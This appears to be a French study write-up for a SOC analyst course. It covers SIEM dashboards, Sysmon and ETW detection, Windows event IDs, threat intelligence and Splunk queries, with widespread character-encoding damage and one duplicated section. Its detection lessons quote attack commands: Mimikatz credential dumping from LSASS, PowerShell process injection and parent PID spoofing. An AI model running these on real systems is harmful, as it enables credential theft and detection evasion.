# Write up Cdsa

## **Incident Handling Process**

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%201.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%202.png)

## **Security Monitoring & SIEM Fundamentals**

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%203.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%204.png)

[View MITRE diagram](https://academy.hackthebox.com/storage/modules/211/MITRE.gif)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%205.png)

## SIEM Visualization Example 1: Failed Logon Attempts (All Users)

```jsx
ğŸ§­ Ã‰tapes Ã  suivre
1. AccÃ©der au systÃ¨me cible

    Ouvrir lâ€™outil SIEM Ã  lâ€™adresse : http://[IP Cible]:5601.

    Aller dans le menu Dashboard.

2. Modifier le Dashboard

    Cliquer sur lâ€™icÃ´ne en forme de crayon pour passer en mode Ã©dition.

    SÃ©lectionner Create visualization pour crÃ©er une nouvelle visualisation.

3. Configurer la visualisation
ğŸ” Filtres

    Event ID : 4624 (connexions rÃ©ussies).

    Type de connexion : RemoteInteractive via le champ winlog.logon.type.

ğŸ“‚ Index

    Utiliser lâ€™index pattern windows* pour cibler les logs Windows.

âœ… VÃ©rification

    Sâ€™assurer que le champ user.name.keyword est bien prÃ©sent dans les donnÃ©es.

ğŸ“Š Type de visualisation

    Choisir le type Table.

4. Configurer la table
ğŸ”  Lignes Ã  afficher

    Compte de service : user.name (filtrÃ© avec svc-*).

    Machine cible : host.hostname.keyword.

    IP initiatrice : related.ip.keyword.

    Nombre d'Ã©vÃ©nements : via l'agrÃ©gat count.

â• MÃ©trique

    SÃ©lectionner count pour afficher le nombre total d'Ã©vÃ©nements.

ğŸ” RequÃªte KQL

user.name: svc-*

5. Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.
```

## **SIEM Visualization Example 2: Failed Logon Attempts (Disabled Users)**

```jsx
ğŸ§­ Ã‰tapes Ã  suivre
1. AccÃ©der au systÃ¨me cible

    Ouvrir lâ€™outil SIEM Ã  lâ€™adresse : http://[IP Cible]:5601.

    Dans le menu latÃ©ral, cliquer sur Dashboard.

2. Modifier le Dashboard

    Cliquer sur lâ€™icÃ´ne en forme de crayon pour passer en mode Ã©dition.

    Cliquer sur Create visualization pour crÃ©er une nouvelle visualisation.

3. Configurer la visualisation
ğŸ” Filtres

    Event ID : 4625 (tentatives de connexion Ã©chouÃ©es).

    Sous-statut : winlog.event_data.SubStatus : 0xC0000072 pour identifier les connexions Ã©chouÃ©es dues Ã  des comptes dÃ©sactivÃ©s.

ğŸ“‚ Index Pattern

    SÃ©lectionner windows* pour utiliser les logs Windows.

âœ… VÃ©rification

    VÃ©rifier que le champ user.name.keyword est bien disponible dans les donnÃ©es.

ğŸ“Š Type de visualisation

    Choisir le type Table.

4. Configurer le tableau
ğŸ”  Champs Ã  afficher

    Utilisateur dÃ©sactivÃ© : via user.name.

    Machine concernÃ©e : host.hostname.keyword.

    Nombre de tentatives : ajouter une mÃ©trique count pour compter les Ã©vÃ©nements.

5. Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.
```

## **SIEM Visualization Example 3: Successful RDP Logon Related To Service Accounts**

```jsx

### ğŸ¯ Objectif

CrÃ©er une visualisation pour surveiller les connexions RDP rÃ©ussies effectuÃ©es par des comptes de service dans un environnement Windows.

### ğŸ§­ Ã‰tapes Ã  suivre

#### 1. AccÃ©der au systÃ¨me cible

* Se rendre sur lâ€™interface SIEM Ã  lâ€™adresse : `http://[IP Cible]:5601`.
* Ouvrir le menu latÃ©ral et cliquer sur **Dashboard**.

#### 2. Modifier le Dashboard

* Cliquer sur lâ€™icÃ´ne **crayon** pour activer le mode Ã©dition.
* SÃ©lectionner **Create visualization** pour dÃ©marrer la crÃ©ation.

#### 3. Configurer la visualisation

##### ğŸ” Filtres

* **Event ID** : `4624` (connexions rÃ©ussies).
* **Type de logon** : `RemoteInteractive` via le champ `winlog.logon.type`.

##### ğŸ“‚ Index Pattern

* Utiliser `windows*` pour filtrer les logs liÃ©s Ã  Windows.

##### âœ… VÃ©rification

* Confirmer que le champ `user.name.keyword` est bien prÃ©sent dans les donnÃ©es.

##### ğŸ“Š Type de visualisation

* Choisir le type **Table**.

#### 4. Configurer le tableau

##### ğŸ”  Champs Ã  afficher

* **Compte de service** : `user.name` (avec un filtre `svc-*`).
* **Machine cible** : `host.hostname.keyword`.
* **IP source** : `related.ip.keyword`.
* **Nombre dâ€™Ã©vÃ©nements** : utiliser la mÃ©trique **count**.

##### â• MÃ©trique

* Ajouter **count** pour afficher le nombre total de connexions.

##### ğŸ” RequÃªte KQL

kql
user.name: svc-*

#### 5. Enregistrer

* Cliquer sur **Save and return** pour enregistrer et revenir au tableau de bord.

```

## **SIEM Visualization Example 4: Users Added Or Removed From A Local Group (Within A Specific Timeframe)**

```jsx
ğŸ§­ Ã‰tapes Ã  suivre
1. AccÃ©der au systÃ¨me cible

    Ouvrir lâ€™outil SIEM via lâ€™adresse : http://[IP Cible]:5601.

    Dans la navigation latÃ©rale, sÃ©lectionner Dashboard.

2. Modifier le Dashboard

    Cliquer sur lâ€™icÃ´ne crayon pour passer en mode Ã©dition.

    Cliquer sur Create visualization pour commencer.

3. Configurer la visualisation
ğŸ” Filtres

    Event IDs : 4732 (ajout dâ€™un utilisateur au groupe) et 4733 (suppression dâ€™un utilisateur du groupe).

    Restreindre aux Ã©vÃ©nements liÃ©s au groupe Administrators via group.name.keyword.

ğŸ“‚ Index Pattern

    Utiliser windows* pour cibler les journaux Windows.

âœ… VÃ©rification

    Sâ€™assurer que le champ user.name.keyword est disponible dans les donnÃ©es.

ğŸ“Š Type de visualisation

    SÃ©lectionner le type Table.

4. Configurer le tableau
ğŸ”  Champs Ã  afficher

    Utilisateur concernÃ© : winlog.event_data.MemberSid.keyword.

    Groupe cible : group.name.keyword (doit Ãªtre "Administrators").

    Action effectuÃ©e : event.action.keyword (ajout ou suppression).

    Machine impliquÃ©e : host.name.keyword.

    Nombre dâ€™Ã©vÃ©nements : ajouter la mÃ©trique count.

5. DÃ©finir la pÃ©riode

    Appliquer un filtre de date allant du 5 mars 2023 jusquâ€™Ã  la date actuelle.
```

## **Windows Event Logs & Finding Evil**

## Analyzing Evil With Sysmon & Event Logs

```jsx
### âš™ï¸ Introduction Ã  Sysmon

**Sysmon** (System Monitor) est un outil Windows qui journalise en dÃ©tail l'activitÃ© du systÃ¨me grÃ¢ce Ã  trois composants principaux :

- **Service Windows** : surveille les actions systÃ¨me.
- **Pilote noyau** : capture les donnÃ©es.
- **Journal dâ€™Ã©vÃ©nements** : affiche les activitÃ©s dÃ©tectÃ©es.

### ğŸ“Œ Ã‰vÃ©nements Sysmon courants :

- **ID 1** : CrÃ©ation de processus
- **ID 3** : Connexion rÃ©seau

La configuration se fait via un fichier XML permettant dâ€™inclure ou dâ€™exclure des Ã©vÃ©nements selon des critÃ¨res prÃ©cis (nom de processus, IP, etc.).

**Configurations recommandÃ©es :**

- SwiftOnSecurity Sysmon Config
- Olaf Hartong Modular Config

### â–¶ï¸ Installation (droits administrateur requis) :

C:\Tools\Sysmon> sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n

### ğŸ“‚ Appliquer une configuration personnalisÃ©e :

C:\Tools\Sysmon> sysmon.exe -c fichier.xml

---

### ğŸ” Cas de dÃ©tection

### 1ï¸âƒ£ **DÃ©tection de DLL Hijacking**

Utilise lâ€™**Event ID 7** (chargement de modules).

### Ã‰tapes :

- VÃ©rifier dans le fichier `sysmonconfig-export.xml` que les Ã©vÃ©nements de type module load ne sont pas exclus.
- Surveiller via : *Event Viewer > Applications and Services > Microsoft > Windows > Sysmon*.

### ğŸ§ª Indicateurs de compromission :

- `calc.exe` exÃ©cutÃ© depuis un rÃ©pertoire en Ã©criture
- `WININET.dll` chargÃ© en dehors de `System32`
- DLL signÃ©e Microsoft remplacÃ©e par une version non signÃ©e

---

### 2ï¸âƒ£ **DÃ©tection dâ€™injection PowerShell/C# dans processus non-managÃ©s**

Surveille lâ€™exÃ©cution anormale de code managÃ© dans des processus natifs.

### Signes Ã  observer :

- Chargement de `clr.dll` ou `clrjit.dll` dans des processus qui nâ€™utilisentt normalement pas .NET
- Analyse des processus via *Process Hacker*

### ğŸ§¬ Exemple dâ€™injection :

powershell
powershell -ep bypass
Import-Module .\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [PID] -PoshCode "Write-Host 'Hello, World!'"

> Event ID 7 peut montrer les DLLs .NET chargÃ©es dans des contextes inhabituels.
> 

---

### 3ï¸âƒ£ **DÃ©tection de vol dâ€™identifiants (ex. : Mimikatz)**

Cible le processus **LSASS** pour lâ€™extraction de mots de passe.

### Surveillance :

- **Event ID 10** : accÃ¨s Ã  des processus sensibles comme LSASS.

### ğŸ” Indicateurs :

- Processus alÃ©atoires accÃ©dant Ã  LSASS
- `SourceUser` diffÃ©rent de `TargetUser` (ex. : waldo accÃ©dant Ã  SYSTEM)
- RequÃªtes de privilÃ¨ge `SeDebugPrivilege`

### ğŸ“Œ Exemple Mimikatz :

C:\Tools\Mimikatz> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

```

## Event Tracing for Windows (ETW)

```jsx
### ğŸ§  Vue dâ€™ensemble : Event Tracing for Windows (ETW)

**ETW (Event Tracing for Windows)** est un outil de journalisation haute performance intÃ©grÃ© Ã  Windows. Il permet de tracer dynamiquement les Ã©vÃ©nements du systÃ¨me en temps rÃ©el, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :

- La dÃ©tection dâ€™anomalies
- Lâ€™analyse des incidents de sÃ©curitÃ©
- Les investigations forensic dÃ©taillÃ©es

ETW couvre un large spectre : appels systÃ¨me, crÃ©ation/terminaison de processus, activitÃ© rÃ©seau, changements de fichiers/registre, etc.

---

### ğŸ§© Composants clÃ©s dâ€™ETW

### ğŸ® Controllers

- GÃ¨rent les sessions ETW (dÃ©marrage, arrÃªt, activation des fournisseurs)
- **Exemple :**

logman.exe query -ets

### ğŸ“¤ Providers

- GÃ©nÃ¨rent les Ã©vÃ©nements
- 4 types :
    - **MOF Providers** : BasÃ©s sur le Managed Object Format
    - **WPP Providers** : Tracing cÃ´tÃ© noyau via annotations dans le code
    - **Manifest-based** : DÃ©finis via XML
    - **TraceLogging** : Fournisseurs modernes simplifiÃ©s

### ğŸ“¥ Consumers

- Souscrivent Ã  des Ã©vÃ©nements prÃ©cis (souvent stockÃ©s en fichiers `.ETL`)

### ğŸ“ Channels

- Regroupent les Ã©vÃ©nements de maniÃ¨re logique, facilitant lâ€™abonnement sÃ©lectif

### ğŸ’¾ ETL Files

- Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

---

### ğŸ› ï¸ Interagir avec ETW

### ğŸ“Œ Commandes via `logman`

- **Lister les sessions actives**

logman.exe query -ets

- **Voir les dÃ©tails dâ€™une session spÃ©cifique**

logman.exe query "EventLog-System" -ets

- **Lister tous les providers disponibles**

logman.exe query providers

### ğŸ–¥ï¸ Interfaces graphiques

- **Performance Monitor** : Visualise et gÃ¨re les sessions ETW
- **EtwExplorer** : Inspecte les mÃ©tadonnÃ©es des providers ETW

---

### ğŸ§© Providers utiles en cybersÃ©curitÃ©

| Provider | Fonction |
| --- | --- |
| `Microsoft-Windows-Kernel-Process` | ActivitÃ© de processus (injection, hollowing) |
| `Microsoft-Windows-Kernel-File` | Surveillance des fichiers (exfiltration, ransomware) |
| `Microsoft-Windows-Kernel-Network` | ActivitÃ© rÃ©seau suspecte |
| `Microsoft-Windows-SMBClient` / `SMBServer` | Suivi du trafic SMB (mouvement latÃ©ral) |
| `Microsoft-Windows-DotNETRuntime` | ExÃ©cution .NET potentiellement malveillante |
| `Microsoft-Windows-PowerShell` | Traces dâ€™activitÃ© PowerShell |
| `Microsoft-Windows-TerminalServices-LocalSessionManager` | DÃ©tection dâ€™accÃ¨s RDP |

---

### ğŸ”’ Provider restreint : Microsoft-Windows-Threat-Intelligence

- Fournisseur avancÃ© nÃ©cessitant des **droits privilÃ©giÃ©s (PPL)**
- UtilisÃ© en **DFIR** (Digital Forensics & Incident Response) pour identifier :
    - Les menaces sophistiquÃ©es
    - Leur origine, impact, et interaction
- Peut Ãªtre activÃ© via contournements spÃ©cifiques, mais reste sensible
```

## Tapping Into ETW

```jsx
### ğŸ§  Vue dâ€™ensemble : Event Tracing for Windows (ETW)

**ETW (Event Tracing for Windows)** est un outil de journalisation haute performance intÃ©grÃ© Ã  Windows. Il permet de tracer dynamiquement les Ã©vÃ©nements du systÃ¨me en temps rÃ©el, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :

- La dÃ©tection dâ€™anomalies
- Lâ€™analyse des incidents de sÃ©curitÃ©
- Les investigations forensic dÃ©taillÃ©es

ETW couvre un large spectre : appels systÃ¨me, crÃ©ation/terminaison de processus, activitÃ© rÃ©seau, changements de fichiers/registre, etc.

---

### ğŸ§© Composants clÃ©s dâ€™ETW

### ğŸ® Controllers

- GÃ¨rent les sessions ETW (dÃ©marrage, arrÃªt, activation des fournisseurs)
- **Exemple :**

logman.exe query -ets

### ğŸ“¤ Providers

- GÃ©nÃ¨rent les Ã©vÃ©nements
- 4 types :
    - **MOF Providers** : BasÃ©s sur le Managed Object Format
    - **WPP Providers** : Tracing cÃ´tÃ© noyau via annotations dans le code
    - **Manifest-based** : DÃ©finis via XML
    - **TraceLogging** : Fournisseurs modernes simplifiÃ©s

### ğŸ“¥ Consumers

- Souscrivent Ã  des Ã©vÃ©nements prÃ©cis (souvent stockÃ©s en fichiers `.ETL`)

### ğŸ“ Channels

- Regroupent les Ã©vÃ©nements de maniÃ¨re logique, facilitant lâ€™abonnement sÃ©lectif

### ğŸ’¾ ETL Files

- Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

---

### ğŸ› ï¸ Interagir avec ETW

### ğŸ“Œ Commandes via `logman`

- **Lister les sessions actives**

logman.exe query -ets

- **Voir les dÃ©tails dâ€™une session spÃ©cifique**

logman.exe query "EventLog-System" -ets

- **Lister tous les providers disponibles**

logman.exe query providers

### ğŸ–¥ï¸ Interfaces graphiques

- **Performance Monitor** : Visualise et gÃ¨re les sessions ETW
- **EtwExplorer** : Inspecte les mÃ©tadonnÃ©es des providers ETW

---

### ğŸ§© Providers utiles en cybersÃ©curitÃ©

| Provider | Fonction |
| --- | --- |
| `Microsoft-Windows-Kernel-Process` | ActivitÃ© de processus (injection, hollowing) |
| `Microsoft-Windows-Kernel-File` | Surveillance des fichiers (exfiltration, ransomware) |
| `Microsoft-Windows-Kernel-Network` | ActivitÃ© rÃ©seau suspecte |
| `Microsoft-Windows-SMBClient` / `SMBServer` | Suivi du trafic SMB (mouvement latÃ©ral) |
| `Microsoft-Windows-DotNETRuntime` | ExÃ©cution .NET potentiellement malveillante |
| `Microsoft-Windows-PowerShell` | Traces dâ€™activitÃ© PowerShell |
| `Microsoft-Windows-TerminalServices-LocalSessionManager` | DÃ©tection dâ€™accÃ¨s RDP |

---

### ğŸ”’ Provider restreint : Microsoft-Windows-Threat-Intelligence

- Fournisseur avancÃ© nÃ©cessitant des **droits privilÃ©giÃ©s (PPL)**
- UtilisÃ© en **DFIR** (Digital Forensics & Incident Response) pour identifier :
    - Les menaces sophistiquÃ©es
    - Leur origine, impact, et interaction
- Peut Ãªtre activÃ© via contournements spÃ©cifiques, mais reste sensible
```

## Get-WinEvent

### ğŸ§  Vue dâ€™ensemble : DÃ©tections avancÃ©es via ETW

**Event Tracing for Windows (ETW)** permet une visibilitÃ© approfondie sur les Ã©vÃ©nements systÃ¨me, allant au-delÃ  des journaux classiques. CouplÃ© Ã  des outils comme **SilkETW**, il permet de dÃ©tecter des tactiques avancÃ©es telles que la falsification de hiÃ©rarchie de processus ou le chargement de DLL .NET en mÃ©moire.

---

### ğŸ” DÃ©tection 1 : Relations parent-enfant anormales

Des processus comme `calc.exe` lanÃ§ant `cmd.exe` peuvent indiquer une activitÃ© malveillante. Ces relations peuvent Ãªtre explorÃ©es avec **Process Hacker**.

### ğŸ­ Simulation dâ€™attaque : *Parent PID Spoofing*

Les attaquants peuvent forger une relation parent/enfant avec un PID falsifiÃ©.

```powershell
powershell -ep bypass
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent([PID], "C:\Windows\System32\cmd.exe", "")

```

### ğŸ“ˆ DÃ©tection avec SilkETW

Pour tracer correctement ces relations :

```
SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json

```

---

### ğŸ§¬ DÃ©tection 2 : Chargement de DLL .NET malveillantes en mÃ©moire

Les attaquants utilisent des assemblages .NET chargÃ©s uniquement en mÃ©moire pour contourner lâ€™antivirus et la dÃ©tection disque (tactique **BYOL â€“ Bring Your Own Land**).

### ğŸ§ª Simulation : Chargement mÃ©moire dâ€™un outil comme *Seatbelt*

Ce type dâ€™attaque charge des bibliothÃ¨ques comme :

- `clr.dll`
- `mscoree.dll`

Sysmon Event ID 7 dÃ©tecte les DLL, mais **ne capture pas lâ€™ensemble du comportement .NET**.

### ğŸ“ˆ DÃ©tection avec SilkETW + Provider .NET

Pour capturer les activitÃ©s .NET runtime :

```
SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json

```

ğŸ§© **Mots-clÃ©s dâ€™intÃ©rÃªt (Keywords)** :

- `JitKeyword` : Compilation Just-In-Time
- `InteropKeyword` : Interactions entre code managÃ©/non-managÃ©
- `LoaderKeyword` : Chargement dynamique dâ€™assemblies
- `NGenKeyword` : Assemblies prÃ©compilÃ©s

## event ID

<aside>
ğŸ’¡

| **Event ID** | **Log Type** | **CatÃ©gorie** | **Description** |
| --- | --- | --- | --- |
| **1074** | System | Shutdown / Restart | Indique un redÃ©marrage ou arrÃªt du systÃ¨me, avec raison. |
| **6005** | System | Service Start | DÃ©marrage du service Event Log (souvent lors du boot). |
| **6006** | System | Service Stop | ArrÃªt du service Event Log (souvent lors de lâ€™arrÃªt). |
| **6013** | System | Uptime | Indique le temps de fonctionnement de Windows en secondes. |
| **7040** | System | Service Configuration | Modification du type de dÃ©marrage dâ€™un service. |
| **7045** | System | Service Installation | Un nouveau service a Ã©tÃ© installÃ© (souvent utilisÃ© par des malwares). |

| **Event ID** | **Log Type** | **CatÃ©gorie** | **Description** |
| --- | --- | --- | --- |
| **1102** | Security | Audit Log | Les logs de sÃ©curitÃ© ont Ã©tÃ© effacÃ©s (souvent utilisÃ© pour couvrir ses traces). |
| **1116** | Security | Antivirus | DÃ©tection de malware par lâ€™antivirus. |
| **1118** | Security | Antivirus | DÃ©but de la remÃ©diation antivirus. |
| **1119** | Security | Antivirus | RemÃ©diation antivirus rÃ©ussie. |
| **1120** | Security | Antivirus | RemÃ©diation antivirus Ã©chouÃ©e. |
| **4624** | Security | Logon | Connexion rÃ©ussie. |
| **4625** | Security | Logon | Connexion Ã©chouÃ©e (possibles attaques brute force). |
| **4648** | Security | Logon | Connexion avec des identifiants explicites (souvent utilisÃ© en dÃ©placement latÃ©ral). |
| **4656** | Security | Access Control | RequÃªte dâ€™accÃ¨s Ã  un objet (fichier, clÃ© registreâ€¦). |
| **4672** | Security | Privileges | Attribution de privilÃ¨ges spÃ©ciaux (administrateurs). |
| **4698** | Security | Scheduled Task | Une tÃ¢che planifiÃ©e a Ã©tÃ© crÃ©Ã©e. |
| **4700** | Security | Scheduled Task | Une tÃ¢che planifiÃ©e a Ã©tÃ© activÃ©e. |
| **4701** | Security | Scheduled Task | Une tÃ¢che planifiÃ©e a Ã©tÃ© dÃ©sactivÃ©e. |
| **4702** | Security | Scheduled Task | Une tÃ¢che planifiÃ©e a Ã©tÃ© modifiÃ©e. |
| **4719** | Security | Audit Policy | Modification de la stratÃ©gie dâ€™audit. |
| **4738** | Security | Account Management | Modification dâ€™un compte utilisateur. |
| **4771** | Security | Kerberos | Ã‰chec dâ€™authentification Kerberos. |
| **4776** | Security | Credential Validation | Validation de mot de passe par le contrÃ´leur de domaine. |
| **5001** | Security | Antivirus Settings | Modification de la configuration de protection en temps rÃ©el. |
| **5140** | Security | Network Share | AccÃ¨s Ã  un partage rÃ©seau. |
| **5142** | Security | Network Share | CrÃ©ation dâ€™un nouveau partage rÃ©seau. |
| **5145** | Security | Network Share | Tentative dâ€™accÃ¨s Ã  un fichier/dossier partagÃ©. |
| **5157** | Security | Network Filtering | Connexion rÃ©seau bloquÃ©e par le pare-feu. |

</aside>

## **Introduction to Threat Hunting & Hunting With Elastic**

```jsx

---

### ğŸ” **Quâ€™est-ce que le Cyber Threat Intelligence (CTI) ?**

Le CTI (Cyber Threat Intelligence) dÃ©signe lâ€™ensemble des informations analysÃ©es sur les menaces cyber permettant dâ€™**anticiper, dÃ©tecter, comprendre et rÃ©pondre aux attaques**. Son objectif est de **passer dâ€™une posture dÃ©fensive rÃ©active Ã  une posture proactive**.

---

### ğŸ§± **Les 4 piliers du CTI efficace :**

1. **Pertinence** : Lâ€™information doit concerner lâ€™environnement ou les partenaires de lâ€™entreprise.
2. **TemporalitÃ©** : Lâ€™information doit Ãªtre transmise rapidement â€“ elle perd de la valeur avec le temps.
3. **ActionnabilitÃ©** : Elle doit pouvoir Ãªtre utilisÃ©e immÃ©diatement pour renforcer la dÃ©fense.
4. **Exactitude** : L'information doit Ãªtre vÃ©rifiÃ©e. Sinon, on indique un niveau de confiance.

---

### ğŸ†š **CTI vs. Threat Hunting :**

| **CTI (PrÃ©dictif)**                                     | **Threat Hunting (Proactif & RÃ©actif)**               |
| ------------------------------------------------------- | ----------------------------------------------------- |
| Anticiper lâ€™adversaire (oÃ¹, quand, comment, pourquoi ?) | Rechercher la prÃ©sence de lâ€™adversaire dans le rÃ©seau |
| Sert Ã  prÃ©dire les attaques                             | Sert Ã  dÃ©tecter des menaces existantes ou passÃ©es     |
| Partage d'infos avec les hunters                        | S'appuie sur le CTI pour orienter les recherches      |

---

### ğŸ§  **UtilitÃ© du CTI :**

* ComprÃ©hension des menaces ciblant lâ€™organisation.
* Aide Ã  la prise de dÃ©cision stratÃ©gique (rÃ©duction du risque).
* Mise en place de plans dâ€™action en cas de crise.

---

### ğŸ“Š **Les 3 niveaux de Cyber Threat Intelligence :**

1. **StratÃ©gique**

   * Pour les dirigeants (C-suite, VPs)
   * RÃ©pond au **"Qui ?"** et **"Pourquoi ?"**
   * Ex : rapports sur APT28, motivations, cibles, historique

2. **OpÃ©rationnel**

   * Pour les managers intermÃ©diaires
   * RÃ©pond au **"Comment ?"** et **"OÃ¹ ?"**
   * Ex : tactiques dÃ©taillÃ©es dâ€™un groupe comme REvil

3. **Tactique**

   * Pour les analystes et dÃ©fenseurs rÃ©seau
   * Fournit des IOCs : IPs, domaines, hashes, etc.
   * UtilisÃ© dans les outils de dÃ©tection (SIEM, EDR, IDS/IPS)

---

### ğŸ“‘ **Lire un rapport de CTI tactique â€“ Ã‰tapes clÃ©s :**

1. **Comprendre le contexte** du rapport (secteur ciblÃ©, objectif).
2. **Identifier et classifier les IOCs** (rÃ©seau, hÃ´te, email, etc.).
3. **Comprendre le cycle de vie de lâ€™attaque** (souvent mappÃ© au MITRE ATT\&CK).
4. **VÃ©rifier les IOCs** (via VirusTotal, OTX, etc.) pour Ã©viter les faux positifs.
5. **ImplÃ©menter les IOCs** dans lâ€™infrastructure (SIEM, firewall, EDRâ€¦).
6. **Chasser les menaces activement** (Threat Hunting basÃ© sur les IOCs et TTPs).
7. **Surveiller et apprendre en continu**, tout en partageant de nouvelles infos.

```

## **Understanding Log Sources & Investigating with Splunk**

## Toutes les commandes

```jsx

---

## ğŸ” **Commandes de base Splunk**

### ğŸ”¹ **Recherche simple**

spl
search index="main" "UNKNOWN"

### ğŸ”¹ **OpÃ©rateurs boolÃ©ens et de comparaison**

spl
index="main" EventCode!=1

---

## ğŸ“„ **Manipulation de champs**

### âœ… **`fields`** â€“ Inclure/exclure des champs

spl
fields - User

### âœ… **`rename`** â€“ Renommer des champs

spl
rename Image as Process

### âœ… **`eval`** â€“ CrÃ©er ou modifier un champ

spl
eval Process_Path=lower(Image)

### âœ… **`rex`** â€“ Extraire via regex

spl
rex max_match=0 "[^%](?<guid>{.*})"

---

## ğŸ“Š **Affichage et tri**

### âœ… **`table`** â€“ Afficher des champs spÃ©cifiques

spl
table _time, host, Image

### âœ… **`dedup`** â€“ Supprimer les doublons

spl
dedup Image

### âœ… **`sort`** â€“ Trier les rÃ©sultats

spl
sort - _time

---

## ğŸ“ˆ **Statistiques et visualisation**

### âœ… **`stats`** â€“ AgrÃ©gations statistiques

spl
stats count by _time, Image

### âœ… **`chart`** â€“ Graphiques/agrÃ©gats visuels

spl
chart count by _time, Image

---

## ğŸ“š **Lookups et enrichissement**

### âœ… **`lookup`** â€“ Croiser avec une source externe

spl
lookup malware_lookup.csv filename OUTPUTNEW is_malware

### âœ… **`inputlookup`** â€“ Lire un fichier de lookup

spl
| inputlookup malware_lookup.csv

---

## â±ï¸ **Filtrage temporel**

spl
index="main" earliest=-7d EventCode!=1

---

## ğŸ”„ **Recherche avancÃ©e**

### âœ… **`transaction`** â€“ Grouper des Ã©vÃ©nements liÃ©s

spl
transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m

### âœ… **Subsearch** â€“ RequÃªte imbriquÃ©e

spl
index="main" EventCode=1 NOT [ search ... ]

---

## ğŸ§° **DÃ©couverte de donnÃ©es**

* **Lister les index**

spl
| eventcount summarize=false index=* | table index

* **Lister les sourcetypes**

spl
| metadata type=sourcetypes

* **Afficher les logs bruts**
spl
sourcetype="WinEventLog:Security" | table _raw

---

## ğŸ“Š **Data Models & Pivot**

* **Data Models** : ModÃ¨le structurÃ© de donnÃ©es Splunk (base des CIM).
* **Pivot** : Interface graphique pour requÃªtes sans Ã©crire du SPL.

---

```

## **Intrusion Detection With Splunk (Real-world Scenario)**

```jsx
## ğŸ§  **Introduction**

- Passage de lâ€™analyse de logs individuels Ã  la **surveillance rÃ©seau complÃ¨te**.
- Utilisation des **Windows Event Logs multi-machines** pour dÃ©tecter les activitÃ©s malveillantes.
- Objectif : **filtrer les faux positifs** et crÃ©er des **requÃªtes prÃ©cises** pour gÃ©nÃ©rer des alertes fiables.

---

## ğŸ“¥ **Sources de DonnÃ©es**

### âœ… DonnÃ©es Ã  ingÃ©rer :

- **BOTS (Boss of the SOC)** â€“ Fournies par Splunk.
- **logs.to** â€“ GÃ©nÃ©re des logs JSON factices.
    
    â¤ Ã€ configurer avec `Indexed Extractions = JSON`.
    

### ğŸ” Exemple de requÃªte pour tout afficher :

index="main" earliest=0

> Plus de 500 000 Ã©vÃ©nements simulÃ©s, avec divers types dâ€™attaques et infections.
> 

---

## âš™ï¸ **Techniques de Recherche Efficaces**

### ğŸ¯ Comparaison de recherches :

- **Recherche gÃ©nÃ©rale** :

index="main" uniwaldo.local

- **Recherche par wildcard** (moins performante) :

index="main" *uniwaldo.local*

- **Recherche ciblÃ©e par champ** (optimisÃ©e) :

index="main" ComputerName="*uniwaldo.local"

---

## ğŸ” **Ã‰vÃ©nements Sysmon Ã  surveiller**

| **Event ID** | **Signification** |
| --- | --- |
| 1 | CrÃ©ation de processus (parent/enfant anormaux) |
| 3 | Connexions rÃ©seau (bruyant mais utile) |
| 5 | Fin de processus (kill suspects) |
| 6 | Chargement de driver (BYOD, rootkits) |
| 10 | AccÃ¨s mÃ©moire (dump, injection, lsass) |
| 25 | DÃ©tournement de processus (tampering) |

### ğŸ” Exemple - Parent/Child suspects :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | stats count by ParentImage, Image

---

## ğŸŒ **DÃ©tection AvancÃ©e & IP Suspectes**

### ğŸ” Exemple de recherche IP :

index="main" 10.0.0.229 | stats count by sourcetype

> Permet dâ€™identifier des connexions sortantes potentiellement malveillantes.
> 

### ğŸ”‘ Dumping de credentials (lsass) :

index="main" EventCode=10 lsass | stats count by SourceImage

---

## ğŸš¨ **CrÃ©ation dâ€™Alertes PrÃ©cises**

### Ã‰tapes :

1. **DÃ©tection des appels UNKNOWN :**

index="main" CallTrace="*UNKNOWN*" | stats count by EventCode

1. **Filtrage des faux positifs (JIT, .NET, wow64, etc.) :**

index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll*" CallTrace!=*clr.dll*" CallTrace!=*wow64*" | where SourceImage!=TargetImage | stats count by SourceImage

1. **Exclusion dâ€™Explorer.exe et regroupement complet :**

index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll*" CallTrace!=*clr.dll*" CallTrace!=*wow64*" SourceImage!="C:\Windows\Explorer.EXE" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrac

> Produit une alerte fiable sur les anomalies rÃ©elles.
>
```

## **Detecting Attacker Behavior With Splunk Based On TTPs**

```jsx
## ğŸ›¡ï¸ DÃ©tection des Tactiques, Techniques et ProcÃ©dures (TTPs) dans Splunk

En cybersÃ©curitÃ©, **identifier les TTPs** des attaquants est essentiel pour dÃ©tecter efficacement les menaces. Cela implique de repÃ©rer des **comportements connus malveillants** ou des **anomalies inhabituelles**.

### ğŸ§­ Deux approches complÃ©mentaires :

1. **TTPs connus** : utiliser des comportements d'attaque documentÃ©s pour crÃ©er des rÃ¨gles de dÃ©tection prÃ©cises.
2. **DÃ©tection d'anomalies** : repÃ©rer des schÃ©mas inhabituels via des analyses statistiques, sans connaissance prÃ©alable de l'attaque.

